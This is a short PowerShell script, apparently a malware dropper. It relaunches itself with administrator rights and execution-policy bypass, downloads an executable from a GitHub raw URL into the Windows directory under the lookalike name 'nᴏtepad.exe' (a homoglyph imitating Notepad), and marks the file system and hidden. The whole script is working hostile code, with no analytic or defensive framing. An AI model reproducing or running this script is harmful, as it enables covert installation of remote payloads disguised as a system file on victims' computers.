if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "ADMIN..."
    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

$system32Path = "$env:windir"
$exeDestination = Join-Path $system32Path "nᴏtepad.exe"

$exeUrl = "https://raw.githubusercontent.com/n0roffbrain/xgproject/main/CMF35.exe"
Invoke-WebRequest -Uri $exeUrl -OutFile $exeDestination

attrib +s +h "$exeDestination"